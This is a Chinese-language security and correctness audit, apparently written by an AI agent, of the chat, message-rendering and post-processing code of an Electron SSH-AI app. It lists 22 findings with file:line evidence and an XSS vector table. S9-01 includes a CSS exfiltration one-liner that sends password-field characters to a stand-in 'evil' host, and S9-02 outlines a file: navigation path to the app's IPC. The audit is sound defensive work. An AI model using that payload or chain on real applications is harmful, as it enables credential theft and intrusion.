# S9 · 会话与消息及后处理

锚点 `a8e588c`。范围：`routes/chat.py`(110-139 + upload:51) / `post_processor.py`(1113，TurnContext:97、标题 430-593) / `routes/settings.py:369-408`(conv-retention)、`:409-418`(post-process) / `agent/pending_delivery.py` / `agent/reflection.py`；渲染层 `SideChatPanel.vue`(2504)、`MessageItem/MessageContentRenderer/ThinkingBlock/MarkdownStream/HistoryPanel`、`utils/markdown.ts`、`client.ts:393`、`:232-255`、`:595`、`useChatPersistence.ts`、`useModelSelector.ts`、`finalizeAgentMessage.ts`、`think-scrubber.ts`、`stores/ssh-ai.ts`。

**行号来源**：以下文件带另一会话的未提交改动 ⇒ 一律 `git show a8e588c:<path>`（标 anchor）：`backend/post_processor.py`、`backend/routes/settings.py`、`backend/database.py`、`backend/main.py`、`src/api/client.ts`、`MarkdownStream.vue`、`MessageItem.vue`、`MessageContentRenderer.vue`、`src/stores/settings.ts`、`ChatPanel.vue`、`src/stores/ssh-ai.ts`、`ModelsPanel.vue`。经 `git diff a8e588c --stat` 确认空差异、可直引工作树行号的：`routes/chat.py`、`src/utils/markdown.ts`、`electron/main.ts`、`electron/preload.ts`、`node_modules/dompurify`、`node_modules/marked`、`HistoryPanel.vue`、`useChatPersistence.ts`、`pending_delivery.py`、`reflection.py`、`SideChatPanel.vue`、`finalizeAgentMessage.ts`、`think-scrubber.ts`、`types/chat.ts`、`ConnectionModal.vue`。

## 发现表

| ID | 维度 | 严重度 | 核验 | 标题 | 主 file:line | 可达性 |
|---|---|---|---|---|---|---|
| S9-01 | a | Major | ✅ | DOMPurify 只加了 `ADD_ATTR`、没禁任何标签/属性 ⇒ `<style>` 与 `style=` **默认放行**，远端输出可控的 markdown 拿到全文档级 CSS | `src/utils/markdown.ts:75-77` → 落点 `MarkdownStream.vue:2`(anchor `v-html`) | 恒（模型回显任何含 `<style>` 的远端文本） |
| S9-02 | a | Major | ✅ | markdown 链接无人拦截，而 `will-navigate` 在生产放行**任意** `file:` URL，`assertTrustedSender` 又是身份判定而非源判定 ⇒ 本地文档接管整套主进程 IPC 面 | `MarkdownStream.vue:97-110`(anchor) + `electron/main.ts:191-206` + `:38-45` + `preload.ts:8` | 需「攻击 HTML 落盘 + 用户一次点击」（上传接口就收 `.html/.htm`，`routes/chat.py:28`） |
| S9-03 | c | Major | ✅ | 消息历史静默截断到 50 条，且截断后的窗口就此成为本地权威 —— 后端分页能力完好却无人用 | anchor `client.ts:410-411` ↔ 唯一调用点 anchor `ssh-ai.ts:120-125` ↔ `useChatPersistence.ts:104,118-124` | 恒（超过 50 条的会话） |
| S9-04 | b | Major | ✅ | 【9634dee 已修】anchor 启动时从库里读出的后处理配置**被丢弃**：四个开关在重启后全部失效，直到有人 PUT 一次设置端点 | anchor `post_processor.py:1097-1101` ↔ `:992` ↔ `:916` ↔ anchor `main.py:90-93` | 每次冷启动确定性发生 |
| S9-05 | b | Major | ✅ | 「第一条消息隐式创建的会话」其标题生成在结构上不可能运行（LLM 与兜底两条路都被门挡住） | anchor `ssh-ai.ts:523-531` + `:557-559` ↔ `useChatPersistence.ts:256-266` ↔ 门在 anchor `post_processor.py:499-505` + `:36` | 全新安装的第一个会话（及删光后自动新建的那个） |
| S9-06 | d | Major | ✅ | 会话删除是不可逆的（消息 + 附件目录 `rmtree`），却是全应用**唯一没有二次确认**的用户数据删除入口 | `HistoryPanel.vue:27-34` → anchor `ssh-ai.ts:139-141` → `useChatPersistence.ts:235-254` → `routes/chat.py:145-163` | 恒（一次误点） |
| S9-07 | a | Minor | ✅ | 远端 `https:` 图片在渲染时自动拉取 ⇒ 会话被打开过的探针（view oracle），带应用 IP/UA | `markdown.ts:75` ↔ `dompurify/dist/purify.cjs.js:680`(`img` ∈ DATA_URI_TAGS) ↔ CSP `main.ts:232` | 恒（查看一条被投毒的消息） |
| S9-08 | c | Minor | ✅ | 后处理没有任何结果通道：`submit()` 的 task_id 被丢掉，所有失败只落日志 | anchor `routes/agent.py:1023` ↔ anchor `post_processor.py:604,639,672-674,726-730,950-957` | 恒（UI 无法区分「没开/失败/还在跑」） |
| S9-09 | b | Minor | ✅ | 无正文的 run 整体跳过后处理 —— 恰恰是 else 分支想让它们可见的那批（失败/早退） | anchor `routes/agent.py:999`、`:1034-1051` | 确定性（`(AI 运行失败，未产生输出)` 那类） |
| S9-10 | b | Minor | ✅ | 记忆/技能抽取用的是**运维** system prompt，而任务要求严格 JSON | anchor `post_processor.py:613`、`:750` ↔ `prompts.py:10-14` ↔ 用户轮 `:568-590`、`:682-711` | 恒（格式冲突 ⇒ `JSON 解析失败` warning；`_parse_skills_lenient:334` 的存在即自证） |
| S9-11 | b | Minor | ✅ | 反思的「safety」得分来自对**工具输出**做子串探测 ⇒ 远端主机内容可影响演化信号 | `reflection.py:153-158`(`("拦截","权限","禁止")` 打在 `tc["result"]` 上) → `:161-186` → `:446-487` → `:495-512` | 恒（含这些词的日志/README 拉低得分并写入 `agent_strategies`） |
| S9-12 | c | Minor | ✅ | `Conversation.status` 声明了后端从不产出的 `'failed'`、`preview` 无人读；而 `list_conversations` 每行带**整条**最后消息正文 | anchor `client.ts:235,239` ↔ anchor `database.py:964`、anchor `routes/agent.py:796`、`:1238`、anchor `database.py:1932-1951` ↔ anchor `database.py:991-1000` | 恒（契约谎报；500 行 × 全文正文的相关子查询每次同步都跑） |
| S9-13 | c | Minor | ✅ | `AgentTraceSnapshot.status` 类型只有 2 值，生产者写的是原始终态（≥4）⇒ `max_reached`/`human_help` 一律渲染成「失败」 | anchor `client.ts:775-776` ↔ anchor `routes/agent.py:985-987,970` ↔ `database.py:1866`(`_TERMINAL_RUN_STATUSES` 4 值) ↔ `AgentFullTrace.vue:17-18` | 恒；第三套词汇：`reflection.py:377 _TERMINAL_STATES` 漏 `human_help` ⇒ 异常规则 1 对该终态永不触发 |
| S9-14 | c | Minor | ✅ | 【9634dee 已修】anchor 的 `keep_count=0` 哨兵含义在保留期 UI 里**写反了** | anchor `ChatPanel.vue:96`（可见描述无哨兵）与 `:148-149`、`:181-183`（注释断言「0 = 清空全部已结束会话」）↔ `database.prune_conversations:2690` `if keep_count is None or keep_count <= 0: return 0` | 恒（用户开保留期填 0 ⇒ 永久 no-op 却以为在清理） |
| S9-15 | c | Minor | ✅ | 【9634dee 已修】anchor 后处理开关只在 App 挂载时读一次，而那通常正是后端还没起来的时候 | anchor `App.vue:100-106`（唯一调用点）↔ anchor `settings.ts:374-387`（catch 吞掉）↔ anchor `:328-333`（PUT 恒发全四字段） | 常规 Electron 冷启动（渲染层比 uvicorn 早数秒） |
| S9-16 | c | Minor | ✅ | 上传接口只收文本，但聊天文件选择器不设 `accept`，被拒的字节已经全量传到 127.0.0.1 | `SideChatPanel.vue:314-321` ↔ `routes/chat.py:24-34,61-69` | 恒（选图片/二进制）；且全仓**没有任何图片粘贴通道**（grep `@paste\|onPaste\|clipboardData` 只命中 SFTP 右键粘贴） |
| S9-17 | d | Minor | ✅ | 配额淘汰下次启动就被撤销，且不修 `currentConvId`，toast 还超售 | `useChatPersistence.ts:53-83`（淘汰只写本地）↔ `:108-141`（同步再把空壳加回来）↔ `:146`、`:155-158`、`:64`、`:67`、`:79-81` | 恒（会话数触顶） |
| S9-18 | d | Minor | ✅ | localStorage 里复原的 `temp-agent-` 占位符永不被清扫 ⇒ 一只永久空白的助手气泡 | `useChatPersistence.ts:34-51` ↔ anchor `ssh-ai.ts:158-205`（收尾只靠会话内状态 watch）↔ `finalizeAgentMessage.ts:204-207`（只处理最新那只） | 运行中退出/被杀（与 S1-01 同因：无 done 也无状态迁移） |
| S9-19 | d | Minor | ✅ | 滚动到底的 watch 以 `length` 为键且非 `immediate` —— 文档记录过的「子组件晚于其数据事件创建」那一类的新实例 | `SideChatPanel.vue:1188-1190`（`scrollToBottom` 在 `:1180-1186`），三处调用者全非 immediate ↔ `SshView.vue:156` 的 `v-if` 挂载 | 恒（带既有会话打开面板、切到同条数会话） |
| S9-20 | d | Minor | ✅ | 关掉 AI 面板即丢弃 posture / 审批模式 / 草稿 / 附件 / 已选技能五项局部态 | `SideChatPanel.vue:646,739,579,584,969`（都在 `SshView.vue:156` 的 `v-if` 子树里）↔ anchor `ssh-ai.ts:243-249` 的承诺只覆盖 run 结果 | 恒（重开面板回到 `normal`/`null`，而后端 `workflowPhase` 仍在驱动行为 ⇒ 两根轴不一致） |
| S9-21 | d | Minor | ✅ | 后处理路径上的死配置与死计算 | anchor `post_processor.py:74`(`memory_similarity_threshold` 全仓零读者)、`reflection.py:324`(`_CONFLICT_PATTERNS = []` ⇒ `:326-373` 每次工具调用都算一遍 `normpath` 序列再返回 `[]`) | 恒（后者模块头 `:15-17` 还把该能力当已交付宣传） |
| S9-22 | d | Minor | ✅ | 消息形态有三套并行定义，其中渲染路径两套都不 import；一个净化选项是空操作 | anchor `types/chat.ts:9-20` vs anchor `MessageItem.vue:53-62` vs `SideChatPanel.vue:514-524`；`markdown.ts:76` 的 `ADD_ATTR:['class',…]` 重复 DOMPurify 默认已含的 `class`；`SideChatPanel.vue:965-966,1063-1064` 四条 watch 守同一条「只开一个浮动菜单」不变量 | 恒（观感/维护面） |

## 落库状态更新（2026-09-29 15:03，`9634dee`）

本片写作期间并行会话提交了 `9634dee`，其中三条与本片的 anchor 结论直接重合（我逐条 `git show 9634dee:<path>` 核过）：

| 本片条目 | 9634dee 的证据 | 状态 |
|---|---|---|
| S9-04（启动丢弃后处理配置） | `9634dee:backend/post_processor.py:1108` `if config is not None: set_post_process_config(config)` | **已修**（修法与本条一致） |
| S9-14（`keep_count=0` 哨兵文案反了） | commit message 明列「保留会话语义纠正：`keep_count=0` 是『不限制』而非『清空全部』，文案与注释同步」 | **已修** |
| S9-15（后处理开关只在 App 挂载读一次） | `9634dee:src/components/settings/panels/ChatPanel.vue:204-210` `onMounted` 内 `void settingsStore.loadPostProcessSettings()` | **已修** |

**未修且仍需裁决**：S9-01（`<style>` 放行）、S9-02（`file:` 导航 + sender 身份判定）、S9-03（50 条静默截断）、S9-05（隐式新建会话的标题结构性失效）、S9-06（删除无确认）。另 9634dee 顺带撤了「无消费者的能力勾选三开关」，与 91 清单 item 23 的裁决一致，不影响本片的 anchor 结论。

## 详情

### S9-01 [dim a][Major] 净化器按默认白名单跑，而默认白名单是含 `style` 的
- LOCATION：`src/utils/markdown.ts:75-77` 是全仓**唯一**的净化入口（配置只有一句 `ADD_ATTR`）：
  ```ts
  return DOMPurify.sanitize(highlighted, { ADD_ATTR: ['class', 'target'] })
  ```
  落点是 `MarkdownStream.vue:2`（anchor）的 `v-html`，字符串在 `:67` 拼接。
- 我逐层证实（不是采信引用）：
  1. **marked 不消毒**：`node_modules/marked/package.json` = 18.0.5，`grep -c sanitize node_modules/marked/lib/marked.esm.js` = **0**；HTML 渲染器是 `html({text:e}){return e}` ⇒ 原始 HTML 块整条透传（词法侧 `pre: t[1]==="pre"||t[1]==="script"||t[1]==="style"` 说明它连 `<style>` 都专门识别为原始块）。
  2. **DOMPurify 3.4.11 的默认允许标签含 `style`**：`node_modules/dompurify/dist/purify.cjs.js:301`（`html$1`，默认 ALLOWED_TAGS）内有 `'style'`；`:315`（默认 ALLOWED_ATTR）内也有 `'style'`。`'style'` 出现在 `:677` 的 `DEFAULT_FORBID_CONTENTS` 只影响「元素被移除时是否保留内容」，而它**不被移除**。未配置任何 CSS 级过滤（`:683` 的 `DEFAULT_URI_SAFE_ATTRIBUTES` 甚至把 `style` 列为 URI 安全属性）。
  3. **CSP 不兜底**：`electron/main.ts:232` 注入的是 `style-src 'self' 'unsafe-inline'` ⇒ 注入的 `<style>` 规则与 `style=` 属性一律生效；同一行的 `img-src 'self' data: https: …` 给外带留了通道。
- CLAIM：注入的是**文档级 CSS**，不是脚本。两条真实影响：① 值外带 —— `<style>input[type=password][value^="a"]{background:url(https://evil/?a)}</style>` 是标准 CSS-value 泄密 PoC，而同一文档里确有口令输入框（`ConnectionModal.vue:61` 密码、`:85` passphrase、anchor `ModelsPanel.vue:190` API Key，均 `:type="showX ? 'text' : 'password'"`）。诚实标注前置条件：**这些输入框只在对应面板打开时存在**，所以外带需要「恶意消息渲染中 + 凭据面板同时打开」；② 更廉价也更容易的一条是**全文档 UI redress** —— scoped CSS 无法压过后注入的全局规则，被藏/被重排的对象可以包括审批卡与 `.message-actions`（审批文案见 S2，卡片是用户唯一的执行前拦截面）。
- 信任边界错位的关键：`MessageContentRenderer.vue:9`（anchor）把**用户气泡与助手气泡走同一组件、同一信任级**渲染，而助手正文里大量是远端命令输出（`cat`/`log_read`/`file_read` 一个运维文档、一份 README、一个抓来的网页）。远端主机因此对渲染 DOM 拥有 CSS 写权。
- 严重度说明：我按 Major 报（非脚本执行、非审批绕过）。**若你把「远端内容可改写审批卡的可见外观」视作审批链路被削弱，本条应升 Critical** —— 那是个产品判断，不是我能从代码裁死的。
- 已核对**不成立**的方向（免你重走）：`<script>`/`onerror`/`<iframe>`/`<object>`/`<svg><script>` 均被默认白名单挡下；`javascript:`/`vbscript:` 在 href 被 `IS_ALLOWED_URI` 挡；`data:` 在 `<a href>` 被挡（`a` ∉ DATA_URI_TAGS）；`target="_blank"` 已由 `markdown.ts:18-26` 的 `afterSanitizeAttributes` hook 强制补 `rel`。XSS 面整表见下方。

### S9-02 [dim a][Major] `will-navigate` 的放行条件是「协议等于 file:」，而 sender 校验管的是「哪个 webContents」
- LOCATION：三层各自没错、合起来有洞：
  - `MarkdownStream.vue:97-110`（anchor）：`handleClick` 只处理 `.code-copy-btn`，**从不拦 `<a>`** ⇒ 锚点点击走浏览器默认导航。
  - `electron/main.ts:191-206`：`const isAllowed = (is.dev && allowedOrigins.has(parsed.origin)) || (!is.dev && parsed.protocol === 'file:') || url === mainWindow?.webContents.getURL()` ⇒ **生产模式放行任意 `file:` URL**，且没有目录约束。
  - `electron/main.ts:38-45` `assertTrustedSender`：`if (event.sender !== mainWindow.webContents) throw` —— 身份判定。导航后仍是同一个 `webContents` ⇒ **照样通过**。`preload.ts:8` 的 `exposeInMainWorld('electronAPI', …)` 对该 webContents 的**每个文档**都跑（`fs:readFile`/`fs:writeFile`/`ssh:connect`/`backend:getToken` 全在 `preload.ts:36+`）。
- 最有力的一条证据是这段守卫自己的注释（`main.ts:32-37`）：「任何受控渲染进程（XSS/**外部 file:// 导航**/未来新增窗口）都能直调 ssh:connect、fs:*、backend:getToken」——它把 `file://` 导航点名为威胁，但用的判据挡不住这一类。
- 对照组：`setWindowOpenHandler`（`main.ts:167-180`）对 `file:` **正确 deny** ⇒ 只有同标签页导航这条路通着，说明作者知道该禁什么，只是两条腿口径不一。
- 可达性（诚实分层）：链条 = 攻击者可控 HTML 落到本地磁盘 + 用户点一次链接。落盘面是现成的：上传接口 `routes/chat.py:28` 的 `ALLOWED_UPLOAD_EXTS` 明确含 `.html`/`.htm`，落点 `<db>/uploads/<conv>/<file_id>_<name>`（`:84`），文件名由渲染层提供；聊天正文里再放一条指向该路径的链接即可（模型回显上传内容这一步在 anchor `ssh-ai.ts:476-484`）。
- 定 Major 不到 Critical 的理由（供裁决推翻）：需要**两个**用户动作（上传 + 点击）且需先知道落盘路径。若要升级，依据应是「渲染内容 → 本机任意文件读 + 全量主进程 IPC，且守卫注释已把该威胁点名」。**归属提醒**：这道守卫在 S9 之外（`electron/main.ts`），按切片分工这条要同时进 S0 的边界档案。

### S9-03 … S9-07
- **S9-07 [a][Minor]** 远端图片自动拉取：查看一条被投毒的消息即发出 `GET https://<attacker>/…`（带应用 IP/UA），是「这个会话被打开过」的 oracle。与 S9-01 同源不同症，故单列并降 Minor。
- **S9-08 [c][Minor]** anchor `routes/agent.py:1023` 调用 `submit()` 后**丢弃返回值**（task_id），后处理各失败分支 anchor `post_processor.py:604`（`unknown model_id` warning）、`:639`、`:672-674`、`:726-730`（技能预算耗尽 ⇒ 仅 `logger.info`）、`:950-957` 全是日志级。UI 里「生成关闭 / 生成失败 / 仍在生成」三者不可区分，会话就是一直挂着截断标题或 `New Chat`。附带登记（非缺陷）：`_generate_skill` 建行 `enabled=0`（anchor `:890`），闸门是**全局** `count_skills_by_source("auto")` vs `max_skills_per_conversation=5`（anchor `:722-730`，语义在 `:68`/`:806-812` 有文档）⇒ 攒满 5 条 auto 技能后该特性对所有后续会话自我关闭；槽位可回收（`routes/skills.py:85-91` 允许删非 builtin），所以这是有文档的取舍，只在「无用户可见信号」这一项下计条。
- **S9-09 [b][Minor]** anchor `routes/agent.py:1034-1051` 的 else 分支给会话补了一条带轨迹快照的助手消息（`(AI 运行失败，未产生输出)` / `(本轮无文本输出)`），但**从不调 `submit()`** ⇒ 首轮标题、记忆投候选、技能抽取三件全跳过。讽刺点：anchor `post_processor.py:488-491` 的 M5 修复正是为了「让无正文的运行也能生成标题」，而这条更常见的入口绕开了它。与 S1-01（客户端断连既无 done 也无 error）互补，不重复计。
- **S9-10 [b][Minor]** anchor `post_processor.py:613`（记忆抽取）与 `:750`（技能抽取）的 system 轮都是 `SSH_MODE_PROMPT`，而 anchor `prompts.py:10-14` 那段教模型「请用中文回答，给出可直接执行的命令时请用 ```bash 代码块包裹……不要调用工具列表中不存在的工具」，同一请求的用户轮却要求裸 JSON（`:568-590`、`:682-711`）。三段子任务里只有起标题有专用 prompt（`:520-525`）。格式冲突的物证就是 `:639`、`:781` 那些 `JSON 解析失败` warning 与 `_parse_skills_lenient`（`:334`）的存在。
- **S9-11 [b→c][Minor]** `reflection.py:153-158` 的 `_BLOCK_KEYWORDS = ("拦截","权限","禁止")` 打在 `tc["result"]` 上 —— 那是**远端命令输出**。含这些词的日志/README 会压低本次 run 的 safety 得分（`_score_safety:161-186`），并由 `:84-93` 把推断出的「触发了安全策略拦截」写回 `RunTrace`，经 `save_reflection:446-487` 落进 `agent_strategies`，再被 `load_reflections_for_evolution:495-512` 当作 recent-10 样本喂给演化引擎。没有执行权，但**跑后打分被内容影响**这一事实应登记。我把维度从审查路的 b 改判为 c（策略反馈链完整性）。
- **S9-03** 见上（图片 oracle）。
- **S9-12** anchor `client.ts:235` 的 `status: 'in_progress' | 'completed' | 'failed'`：全仓写入者只有 create→`'completed'`（anchor `database.py:964`）、run 起→`'in_progress'`（anchor `routes/agent.py:796`）、run 终→`'completed'`（anchor `:1238`）、启动复位→`'completed'`（anchor `database.py:1932-1951`）⇒ **`'failed'` 不可表示**；`preview`（`:239`）grep 全 src 零消费者。同时 anchor `database.py:991-1000` 的 `list_conversations` 用相关子查询为每行取**完整**的最后一条消息正文（最多 500 行），而 `useChatPersistence.ts:110` 每次同步都跑它。
- **S9-13** anchor `client.ts:775-776` 把 `AgentTraceSnapshot.status` 声明为两值，anchor `routes/agent.py:985-987` 与 `:970`（`update_agent_run(status=final_state)`）写的是原始终态，权威枚举见 `database.py:1866`（`completed/failed/human_help/max_reached`）。渲染侧 `AgentFullTrace.vue:17-18` 是字面二元 `=== 'completed' ? '完成' : '失败'` ⇒ `max_reached`/`human_help` 显示「失败」。第三套词汇在 `reflection.py:377 _TERMINAL_STATES`（漏 `human_help`），后果是异常规则 1 对 `human_help → acting` 永不触发。与 S1 的 SSE 事件表同一族（传输面 vs 落库面），交叉引用不重复计。

### S9-04 [dim b][Major] 启动读了库、传给了 Manager、忘了传给全局 —— 而全局才是生效的那份
- LOCATION：anchor `main.py:90-93` 的注释自称是修复（「从数据库加载后处理配置，避免使用默认值导致用户设置不生效」），实现是 `post_config = load_post_process_config_from_db(); init_post_process_manager(post_config)`；anchor `post_processor.py:1097-1101` 只 `global _manager`，**从不碰 `_config`**；`_config` 停在 anchor `:79` 的 `PostProcessConfig()`（`enabled/generate_title/extract_memory/generate_skill` 全 True）；而 anchor `:992`（`submit()`）每次都 `self.config = get_post_process_config()` **覆盖构造快照**，anchor `:916`（`post_process_after_turn`）再读一次那份全局。唯一写 `_config` 的是 `set_post_process_config`，全仓只被 anchor `routes/settings.py:438-439`（PUT 端点）调用。
- CLAIM：库裡写着 `post_process.enabled=false` ⇒ 运行时照旧起标题、照旧把记忆投进候选队列（anchor `:664-672`）、照旧造 auto 技能；而 anchor `GET /settings/post-process`（`:409-415`）直读 DB 报 `false` —— **面板与运行时在整个进程生命周期内各说各话，而用户看到的是「我关掉了」**。
- **工作树已修（未提交）**，且修法与本条一致：`git diff a8e588c -- backend/post_processor.py` 显示 `init_post_process_manager` 补了 `if config is not None: set_post_process_config(config)`，新 docstring 把症状描述得比我还清楚（「只传给 Manager 等于没传……面板与运行时各说各话，且用户看到的是『我关掉了』」）。`get_post_process_manager()` 的惰性路径（anchor `:1089-1094`）仍不带配置，但因 `main.py` 恒先 init 而不可达。按裁决口径：本条只对 anchor 成立，归「另一会话正在修」，**不要重复开工单**。

### S9-05 [dim b][Major] 标题生成为什么对新会话结构性失效
- LOCATION：anchor `ssh-ai.ts:523-531` —— 无当前会话时先 `const title = effectiveContent.slice(0, 30) + '...'` 建本地会话（`:526`），**紧接着**才 `await persistence.ensureBackendConversation(conv)`（`:531`）；`useChatPersistence.ts:256-266` 的 `ensureBackendConversation` 用 `api.createConversation(conv.title, …)` 建行。门在 anchor `post_processor.py:499-505`：`if not conv or (conv.get("title") or "") not in _DEFAULT_TITLES: return`，而 `_DEFAULT_TITLES` = anchor `:36` 的 `{"New Chat","新对话","New Conversation",""}`。
- CLAIM：库里那一行**生下来就带着前端派生的 30 字标题**，不在默认集合里 ⇒ LLM 起标题与 `_apply_fallback_title` 两条路都早退，永久不再跑。对照：**「+」新建路径能工作纯属顺序巧合** —— `handleNewChat` 给的是 `'New Chat'`，而 `ensureBackendConversation`（`:531`）跑在本地标题改写（`:557-559`）**之前**，所以建行时 DB 拿到的是集合内的值。
- 可达性：全新安装的第一个会话（`conversations` 为空时 `:524` 必进该分支），以及删光所有会话后自动新建的那一个。
- 已核对**不是**本条：`_apply_fallback_title` 在 anchor 是**存在的**（`post_processor.py:465-482`，失败与超时两条路 `:516`/`:539` 都调），并有 `test_post_process_round13b.py:109-160` 钉住（`c24c802`/`90043f3` 均为 ancestor）⇒ 命中勿重议，不报「没有兜底」。本条报的是兜底**进不去**。

### S9-03 / S9-06 [dim d][Major] 删除入口的确认策略在全应用内不一致
- LOCATION：`HistoryPanel.vue:27-34` 的垃圾桶按钮 `@click="$emit('delete', conv.id)"` 直接上抛 → `SideChatPanel.vue:1330` → `SshAiPanel.vue:173-175` → anchor `ssh-ai.ts:139-141` → `useChatPersistence.ts:235-254` → `DELETE /chat/conversations/{cid}` → `routes/chat.py:145-163`：`db.delete_conversation(cid)` 之后对 `<db>/uploads/<conv>/` 执行 `shutil.rmtree`。
- CLAIM：一条消息历史 + 附件目录的**不可逆**删除，无 `useConfirm`、无回收站、无 undo。对照全应用其余破坏性入口都有确认：`SchedulesView.vue:565`、`QuickCommandBar.vue:153`、`RemoteManager.vue:287,309`、`SftpView.vue:829`、`ModelsPanel.vue:572` —— 聊天是唯一的例外。按钮也**没有**在 `props.agentRunning` 上加闸（对照 `handleSend`，`SideChatPanel.vue:1289`）。
- 同触发的连带缺陷：run 进行中删会话 ⇒ done 块里的 `add_message`（anchor `routes/agent.py:1000`）违反外键（`database.py:64` 确实 `PRAGMA foreign_keys=ON`）⇒ 被 anchor `:1052-1053` 的 catch-all 吞掉 ⇒ `submit()`（`:1023`）跳过，而 anchor `:1090` 的反思仍为那个 run 写了一条 `agent_strategies`，而它的 `agent_runs` 行已随 `database.py:255` 的级联删除消失 ⇒ **喂给演化引擎的孤儿策略**。
- 正面核实（避免误读）：`rmtree` 本身是消毒过的 —— `routes/chat.py:151-161` 先 `_sanitize_conv(cid)`，空 cid 落共享 `"uploads"` 子目录不删，且断言 `root in conv_dir.parents` 才 rmtree。**没有**路径穿越面；本条只裁「无确认」与「删除与 run 的竞态留痕」。

## XSS 面整表（S9 的交付物之一，逐向量核过）

| 向量 | file:line | 是否净化 | 结论 |
|---|---|---|---|
| `v-html` 落点数量 | `MarkdownStream.vue:2`（anchor）是 `src/` 里**唯一**的 `v-html`/`innerHTML`（全仓 grep） | 是（统一走 `renderMarkdown`） | 单一咽喉，结构上是对的 |
| 原始 HTML 块（`<img onerror>`/`<script>`/`<svg><script>`/`<iframe>`/`<object>`） | `markdown.ts:47` → `:75` | 是（`on*` 属性与 script/iframe/object 不在白名单） | 阻断 |
| href/src 里的 `javascript:`、`vbscript:`（含空白混淆形态） | `markdown.ts:75` | 是（`IS_ALLOWED_URI` + `ATTR_WHITESPACE` 剥离，见 `purify.cjs.js:~360,1646`） | 阻断 |
| `<a href>` 里的 `data:` | `markdown.ts:75` | 是（`a` ∉ `DATA_URI_TAGS`，`purify.cjs.js:680`） | 阻断 |
| `<img src>` 里的 `data:` | `markdown.ts:75` | 允许但不执行（图片上下文） | 可接受 |
| 远端 `<img src=https://…>` 渲染时自动拉取 | `markdown.ts:75` + CSP `main.ts:232` | 「净化」（按设计放行） | **Minor**（S9-07，来自远端输出的 tracking/view oracle） |
| `<style>` 元素 / `style=` 属性（UI redress、CSS 值外带） | `markdown.ts:75`；标签 `purify.cjs.js:301`、属性 `:315` | **否 —— 原样放行** | **Major**（S9-01） |
| `target="_blank"` 反向标签劫持 | `markdown.ts:18-26` hook + `main.ts:167-180` `setWindowOpenHandler` | 是（强制补 `rel`、窗口 deny） | ok |
| `<a href>` 点击导航 | `MarkdownStream.vue:97-110`（anchor，无拦截）→ `main.ts:191-206` | http(s)：`preventDefault` + `openExternal`；**`file:` 在生产放行** | **Major**（S9-02） |
| 流式分片 markdown / tick 中途未闭合标签 | `MarkdownStream.vue:57-68`（anchor）前缀与尾巴**各自**净化 | 是（DOMPurify 输出必为良构 HTML，拼接无法重新打开标签）；围栏配平守卫 `:37-38` | ok（只有结构伪影，`:22-27` 已文档化） |
| highlight.js 输出被当 HTML 再插入 | `markdown.ts:56-64` | 是（`decodeHtml` 后由 hljs emitter 重新转义；catch 分支保留 marked 已转义文本） | ok |
| 围栏 info string 写进标记 | `markdown.ts:55`（`safeLang` 削成 `[^-\w.+#]`） | 是（两处插值前都削） | ok |
| 工具入参/结果、轨迹文本 | `AgentTraceInline.vue`、`AgentFullTrace.vue`、`ThinkingBlock.vue:20`、`MessageContentRenderer.vue:10` | 全部 `{{ }}` 插值，无 `v-html` | ok |
| 上传文件正文在用户气泡里按 markdown 渲染 | anchor `ssh-ai.ts:476-484` + `MarkdownStream` | 走同一净化器 —— 但**继承 `<style>` 缺口**；`.html` 上传同时是 S9-02 的落盘面 | 见 S9-01 / S9-02 |
| 历史标题 | `HistoryPanel.vue:25` | 插值 | ok |
| 未知 DOMPurify 绕过时的 CSP 兜底 | `main.ts:232` `script-src 'self'` | 是（内联 handler 与 `<script>` 即使 HTML 过关也被 CSP 拦） | **强纵深防御** —— 也是本条没到 Critical 的原因之一 |

## 未覆盖声明（诚实边界）

- **`SideChatPanel.vue`(2504) 只覆盖了脚本主干**：完整读完 `488-1346` 分六段（props/emits、上传状态机、`+` 菜单、posture/审批两根轴、chip 视图、技能菜单与 `/` 触发、`displayMessages`、滚动 watch、发送/草稿/expose 面）；模板只读了 `1-120` 与 `311-321`。**未审**：模板 `120-311` 与 `321-486`（`+` 菜单标记、权限下拉标记、chip 详情浮层、技能菜单列表、输入工具条、中止横幅）、脚本 `760-794`（`openPermMenu`/`closePermMenu`/`togglePermMenu` 体内）、脚本 `1210-1270`（`handleKeydown` 体内含 IME 守卫与菜单路由，只看了开头几行）、以及整个 `1348-2504` 的 `<style>` 块。**这些区域不应被读作「干净」。**
- `routes/agent.py` 只在与 S9 相接处读（状态迁移、done 写入 + `submit()` 那一段、保留期钩子）—— 回合循环内部归 S1，不重复审。
- `HistoryPanel.vue:130-243` 是 CSS；`reflection.py` 除 `:300-322` 外均读。

## 闸门

- 动态/半动态证据（全部零 DB 触达、只读依赖包内部）：`grep -c sanitize node_modules/marked/lib/marked.esm.js` → 0；`node_modules/dompurify/package.json` version → 3.4.11；`purify.cjs.js` 的 `:301/:315/:680/:683/:677` 白名单成员逐个确认含 `'style'`/`'img'`；`node_modules/marked/package.json` → 18.0.5。
- **未执行 pytest / vitest**（并行会话持 SQLite 写锁；见 `00-INDEX.md` 警示块）。`vue-tsc` 未单独跑 —— 本片新增发现均为行为/契约类，不依赖类型面信号。
- 涉及另一会话在写的四条（S9-04、S9-14、S9-15 及 S9-13 的 `human_help` 侧）均已在正文标「工作树已修（未提交）」，落库与否请你在裁决时一并确认，别按本片的 anchor 结论重复开工单。
